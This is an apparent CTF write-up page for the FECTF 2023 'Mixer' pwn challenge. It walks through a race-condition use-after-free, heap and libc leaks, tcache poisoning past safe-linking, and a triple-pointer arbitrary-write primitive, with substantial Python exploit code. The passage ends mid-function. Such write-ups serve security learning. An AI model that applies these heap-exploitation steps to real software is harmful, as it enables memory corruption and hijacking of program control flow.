<!doctype html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Writeups</title>
        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({
                tex2jax: {
                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
                    processEscapes: true
                },
                config: ["MMLorHTML.js"],
                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
                extensions: ["MathMenu.js", "MathZoom.js"]
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
    </head>
    <body>
        <div id="navbar">
            <a href="/CTF-writeups" id="root-link">
                <h2>Rektedekte</h2>
            </a>
            <ul id="nav-links">
				<li><a href="/CTF-writeups/search" class="no-flash">
					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
				</a></li>
                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
                </a></li>
                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
                </a></li>
                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
                </a></li>
            </ul>
        </div>
        
    <div id="content">
        <h3>
            <a href="/CTF-writeups\fectf-2023">FECTF 2023</a>
            <a href="/CTF-writeups\fectf-2023\mixer/files.zip" class="text-right">Download</a>
        </h3>
        <h1>
            <span>Mixer</span>
            <span class="text-right">[-]</span>
        </h1>
        <hr class="no-space">
        
            
    <div class="tags">
        
            
                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
            
        
    </div>

        
        
            <div id="markdown">
                <h2>Description</h2>
<p>For this challenge, we are given a binary along with a corresponding libc 2.36. It came with the following description:</p>
<blockquote>
<p>So... we've found this thing. Not really sure what it's for.</p>
<p>Running at <code>mixer.ctf:1337</code>.</p>
<p>Warning: be careful naming your namespace or other people may read your files!</p>
</blockquote>
<hr />
<h2>TLDR</h2>
<p>Triggering a race condition in <code>f_load</code> causes a dangling pointer to a freed chunk. Leaking pointers from overlapping chunks and carefully linking content pointers on the heap, turns tight restrictions into a powerful ARB-write primitive, which can be used to hijack program-flow.</p>
<hr />
<h2>Recon</h2>
<h3>Overview</h3>
<p>Disassembling the program, we are presented with a program for creating, modifying and saving so-called "slots" . At the very beginning of execution, the user is prompted for a "namespace", which correlates to workspace folder on the target machine. To go along with this functionality, the program has a range of functions, best described by the included help page:</p>
<div class="codehilite"><pre><span></span><code>&gt; help
use &lt;filename&gt;
  Find a free slot for &lt;filename&gt;
fin &lt;slot&gt;
  Finnish using &lt;slot&gt;
load &lt;slot&gt;
  Load data from its associated file into &lt;slot&gt;
save &lt;slot&gt;
  Write data in &lt;slot&gt; to its associated file
drop &lt;slot&gt;
  Discard data in &lt;slot&gt;
rand &lt;slot&gt; &lt;n&gt;
  Put &lt;n&gt; random bytes in &lt;slot&gt;
zero &lt;slot&gt; &lt;n&gt;
  Put &lt;n&gt; zeros in &lt;slot&gt;
add,cpy,xor,alt,max,min &lt;dst&gt; &lt;src&gt;
  Run operation on data in &lt;dst&gt; and &lt;src&gt;, storing the result in &lt;dst&gt;
list
  List all slots
show &lt;slot&gt;
  Show contents of &lt;slot&gt;
help
  This
</code></pre></div>

<p>Slots consist of two parts, the name and the content, both allocated on the heap upon request. The exact structure is defined as:</p>
<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">slot_t</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">content</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Interestingly, there doesn't appear to be any way to directly input data into these slots. The closest we have is the <code>rand</code> and <code>zero</code> functions, which will fill a slot with n bytes of either random or null bytes. On top of this, we have a range of functions for modifying existing slot content byte-wise, though once again, nothing that asserts direct control over the content.</p>
<h3>Finding the bug</h3>
<p>I was initially confused by the nature of this challenge. Since the challenge makes active use <code>malloc</code> and <code>free</code>, it was safe to assume that heap exploitation was in order. However, after looking through the program a few times, I simply came to the conclusion, that no conventional bugs are to be found in the program. Even the <code>realloc</code> in <code>f_load</code> that I initially suspected to be exploitable turned back nothing, as the program correctly overwrites the existing content pointer.</p>
<p>It was then I began to speculate. The challenge includes something I can only assume to be hint, reminding us that namespaces are available to everyone. Putting two and two together, I realized that a race condition might be possible.</p>
<p>Interestingly enough, the program has multiple glaring holes in its error handling. Through normal execution, these cases aren't really possible to hit. However, since the program handles files, it's entirely possible that one instance of the program could mess with data that another instance is already working with. This is in turn exploitable. Take the following code in <code>f_load</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="p">...</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Read %ldB into slot #%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="n">v11</span><span class="p">);</span>
<span class="w">      </span><span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Read failed&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">slot</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>If <code>read</code> fails to read <code>length</code> number of bytes, the program will assume that something went wrong, causing it to free the content chunk. Too bad it doesn't discard the pointer afterwards, leaving a dangling pointer to a freed chunk :)</p>
<hr />
<h2>Exploitation</h2>
<h3>Race condition POW</h3>
<p>Before assembling an entire exploit around this idea, I first wanted to verify that this race condition is indeed possible. Assembling some python code, the following script should be able to trigger the given case:</p>
<div class="codehilite"><pre><span></span><code><span class="sd">&quot;&quot;&quot; Dupe code &quot;&quot;&quot;</span>
<span class="n">stop_dupe</span> <span class="o">=</span> <span class="kc">False</span>

<span class="k">def</span> <span class="nf">dupe_loader</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This is the rc loader. It continuesly loads the dupe file until it hits a failed read, </span>
<span class="sd">    meaning the size of the file has changed, and the chunk has been freed with a dangling pointer.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">load_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

        <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;failed&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
            <span class="k">return</span>

<span class="k">def</span> <span class="nf">dupe_saver</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This is the rc saver. It continuesly saves the same file, alternating between two sizes.</span>
<span class="sd">    When the file size changes down during a read, read will return one less than expected in the loader.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_dupe</span><span class="p">:</span>
        <span class="n">zero_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">save_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
        <span class="n">zero_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
        <span class="n">save_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">dupe_chunk</span><span class="p">(</span><span class="n">conn1</span><span class="p">,</span> <span class="n">conn2</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Runs the rc thread. &quot;&quot;&quot;</span>

    <span class="k">global</span> <span class="n">stop_dupe</span>
    <span class="n">t1</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">dupe_saver</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>

    <span class="n">t1</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">dupe_loader</span><span class="p">(</span><span class="n">conn1</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
    <span class="n">stop_dupe</span> <span class="o">=</span> <span class="kc">True</span>
    <span class="n">t1</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>

<span class="c1"># Start conn, the main tube we will be exploiting</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">use_namespace</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">)</span>

<span class="c1"># Create a second conn to do the race condition</span>
<span class="n">conn2</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">no_gdb</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">use_namespace</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">)</span>

<span class="c1"># Create a victim chunk to dupe</span>
<span class="n">VICTIM</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;victim&quot;</span><span class="p">)</span>
<span class="n">use_conn</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="s2">&quot;victim&quot;</span><span class="p">)</span>

<span class="c1"># Run the dupe and close the second connection</span>
<span class="n">dupe_chunk</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">conn2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x417</span><span class="p">)</span>
<span class="n">conn2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>

<p>The first thread, that being the main connection, continuously loads the file "victim" from disk. While this is happening, the second thread is spamming <code>zero</code> and <code>save</code>, saving two different sizes to the same file. When the file size goes from size + 1 to size while <code>load</code> is getting the size and reading the file, <code>read</code> will only read the available number of bytes, causing the error condition to be fulfilled. Running the code, we indeed get a freed dangling pointer:</p>
<div class="codehilite"><pre><span></span><code>pwndbg&gt; malloc_chunk 0x558d757f05f0
Top chunk | PREV_INUSE
Addr: 0x558d757f05f0
Size: 0x20a11

pwndbg&gt; search --pointer 0x558d757f0600
Searching for value: b&#39;\x00\x06\x7fu\x8dU\x00\x00&#39;
[heap]          0x558d757f02c8 0x558d757f0600
[stack]         0x7ffc1d7d3da0 0x558d757f0600
</code></pre></div>

<h3>Getting leaks</h3>
<p>Since the bug gives us a dangling pointer, we can easily utilize it to get leaks. For my exploit, I chose to simplify the process by doing a little more work. Libc pointers can of course be found in unsortedbin chunks, but instead of reading a tcache fd, we can easily bypass safe-linking by linking another unsortedbin chunk into the unsortedbin, and then reading a heap pointer from an fd or bk.</p>
<p>We can do this by allocating four chunks back from the unsortedbin, where the previous victim chunk was consolidated:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Names of these new chunks will appear at the old victim chunk</span>
<span class="n">DUP</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;dup&quot;</span><span class="p">)</span>
<span class="n">G1</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;guard1&quot;</span><span class="p">)</span>
<span class="n">LINK</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;link&quot;</span><span class="p">)</span>
<span class="n">G2</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;guard2&quot;</span><span class="p">)</span>

<span class="c1"># Create two chunks outsize tcache and guards in between</span>
<span class="n">zero</span><span class="p">(</span><span class="n">DUP</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">G1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">LINK</span><span class="p">,</span> <span class="mh">0x418</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">G2</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="c1"># Free both of them, they will now point at each other</span>
<span class="n">drop</span><span class="p">(</span><span class="n">DUP</span><span class="p">)</span>
<span class="n">drop</span><span class="p">(</span><span class="n">LINK</span><span class="p">)</span>

<span class="c1"># Leaking VICTIM will leak into the DUP chunk, which contains libc and heap pointers</span>
<span class="n">show</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;(No&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[</span><span class="mi">128</span><span class="p">:]</span>

<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xab0</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1d2cc0</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>

<h3>What to do now?</h3>
<p>As i mentioned in the recon section, we have no way to directly input data into slots. If we did, the rest of the exploit would be simple; poison the tcache, pointing it at any exposed function pointers, then hijack program flow.</p>
<p>We can technically control slot names directly. However, the program will return with an error, if the input contains non-alphanumeric values, and because of that, nothing will ever be written, and no chunk will ever be allocated.</p>
<p>Instead, we will have to result to more unique exploitation strategies. I assume there are multiple ways to go from here. The method I chose, is what I would like to call the triple pointer approach.</p>
<p>Take the setup displayed below:</p>
<p><img alt="" src="triple-ptr-1.png" /></p>
<p>As we can see, PTR 3 is pointing at PTR 2 which is pointing at PTR 1. Using this configuration, we can edit each byte of PTR 1, by simply incrementing the value at PTR 2, which is PTR 1. When we are done with a given byte of PTR 1, we simply use PTR 3 to increment PTR 2, from which we can then edit the next byte of PTR 1. By doing this repeatedly, we can forge entire pointers inside PTR 1. We can then repeat the same method, incrementing each byte at the target.</p>
<p>This method assumes that we are able to increment values, which I will explain in the following section. Other than that, once this setup has been achieved, we can write any amount of data at any place in the binary, achieving a full arbitrary write.</p>
<h3>Creating incrementors</h3>
<p>For the following exploit, I will need the ability to somehow control the data inside of a slots content. In order to do that, I will generate slots that contain the bytes <code>0x01</code>, <code>0x0001</code> and <code>0x0100</code>. The length two incrementors are used to increment slots of length 2, since the program otherwise wraps and increments both bytes by 1 (though you could technically get away without these).</p>
<p>Initially, I simply randomized a single byte until it became <code>0x01</code>. This theoretically works, and should return the correct value in about 180 tries on average. However, something about the use of <code>urandom</code> seems to make it unstable, and the program will often hang.</p>
<p>Instead, I will use the cyclic nature of numbers over modulo 256. I can simply generate a random number, then calculate its modulo inverse, that being the number $a$ such that $ax\equiv1\space (\text{mod}\space256)$ for a given $a$. In python, this can be done by simply taking <code>x = pow(a, -1, 256)</code>.</p>
<p>The following script does just that, including some extra code for generating <code>0x0001</code> and <code>0x0100</code>. Once these have been created, they can simply be saved to disk, such that we don't need to create them again.</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">create_incrementors</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Creates the incrementor slots, ie. the slots containing \x01, \x00\x01 and \x01\x00.</span>
<span class="sd">    I initially just randomized the chunk until i got a one, but that whas unstable, probably because of opening urandom.</span>
<span class="sd">    Here, I use rand to generate a number with a modulo invers of less than 50, after which i just add the number n times to itself.</span>
<span class="sd">    This works basically all the time. This file won&#39;t be run while the files exist on the remote.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">period</span> <span class="o">=</span> <span class="mi">999999</span>
    <span class="n">TEMP</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;temp&quot;</span><span class="p">)</span>

    <span class="c1"># Initialize the slots with values</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

    <span class="c1"># Iterate until the modulo invers is less than 51</span>
    <span class="k">while</span> <span class="n">period</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>

        <span class="c1">#  Get a single random byte</span>
        <span class="n">rand</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">show</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;(&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

        <span class="c1"># python throws a ValueError if the number is not inversable</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">period</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
            <span class="k">pass</span>

    <span class="c1"># Duplicate the \x01 into a temporary slot</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">TEMP</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">cpy</span><span class="p">(</span><span class="n">TEMP</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

    <span class="c1"># Add the number to itself `period` times</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">period</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="n">TEMP</span><span class="p">)</span>

    <span class="c1"># This is a bit of trickery</span>
    <span class="c1"># We can use the alt function to create \x00\x01 and \x01\x00</span>
    <span class="n">cpy</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
    <span class="n">alt</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">alt</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

    <span class="c1"># Save all the files for future usage</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">)</span>

    <span class="c1"># Save is an implicit drop, so we need to load them again</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">)</span>

    <span class="c1"># Finally, we can delete the temporary slot</span>
    <span class="n">fin</span><span class="p">(</span><span class="n">TEMP</span><span class="p">)</span>
</code></pre></div>

<h3>Setting up the pointers</h3>
<p>I will first create the slots for PTR and PTRPTR, such that their names aren't subject to the dupe. Afterwards, we free a few chunks into the tcache to populate it, including the chunk on top of the old victim chunk, which in this case is the name field of the "dup" slot.</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Create PTR and PTRPTR</span>
<span class="n">PTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">PTRPTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptrptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="c1"># Link a few chunks into tcache</span>
<span class="n">fin</span><span class="p">(</span><span class="n">G1</span><span class="p">)</span>
<span class="n">fin</span><span class="p">(</span><span class="n">G2</span><span class="p">)</span>
<span class="n">fin</span><span class="p">(</span><span class="n">DUP</span><span class="p">)</span>
</code></pre></div>

<p>Victim now points at the encrypted fd of a <code>0x20</code> size tcache bin. We can now use the incrementors we created, in order to modify the lower two bytes of the pointer, redirecting the tcache:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># VICTIM points at the DUP chunks name chunk.</span>
<span class="c1"># By freeing it, then writing to it with VICTIM, we can poison the tcache.</span>
<span class="n">zero</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="c1"># Calculate the address to place by safe-linking</span>
<span class="c1"># In this case, target is a pointer to the pointer in PTRPTR</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x3a0</span>  <span class="c1"># Pointer to PTRPTR</span>
<span class="n">val</span> <span class="o">=</span> <span class="n">target</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
<span class="n">val1</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
<span class="n">val2</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

<span class="c1"># Increment to redirect the tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val1</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">VICTIM</span><span class="p">,</span> <span class="n">ZERO_ONE</span><span class="p">)</span>
</code></pre></div>

<p>Notice that the <code>zero</code> function reallocates the chunk at victim, but since we are dealing with tcache, <code>realloc</code> doesn't react to the fact that the chunk is already freed. If this were a problem, it could easily be bypassed.</p>
<p>After redirecting the tcache, we can create a new slot. The fake chunk is currently second in line, so the first allocation for a name field returns a real chunk, while the content field receives the fake chunk:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Allocating now comes from our fake pointer, giving us a pointer to PTRPTR</span>
<span class="n">PTRPTRPTR</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;ptrptrptr&quot;</span><span class="p">)</span>
<span class="n">zero</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</code></pre></div>

<p>Since PTRPTRPTR is pointing at PTRPTR, we simply need to redirect PTRPTR into PTR to create the full chain. We can do the exact same as before, just without the encryption:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># We now do the same thing, but into PTR instead</span>
<span class="n">val</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x388</span>  <span class="c1"># Pointer to PTR</span>
<span class="n">val1</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
<span class="n">val2</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val1</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">val2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ZERO_ONE</span><span class="p">)</span>
</code></pre></div>

<p>This completes the chain, linking PTRPTRPTR -&gt; PTRPTR -&gt; PTR. Using the following functions, we can redirect PTR to any place in the binary, then write any value into the given address:</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">write_ptr_val</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Writes a pointer into the PTR slot for use in ARB write.</span>
<span class="sd">    Also resets PTRPTR to the start of PTR.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

        <span class="c1"># Clear the given byte, easier than knowing it</span>
        <span class="n">cpy</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
        <span class="n">xor</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Add 1 until we have the desired value</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">byte</span><span class="p">):</span>
            <span class="n">add</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Increment PTRPTR by one</span>
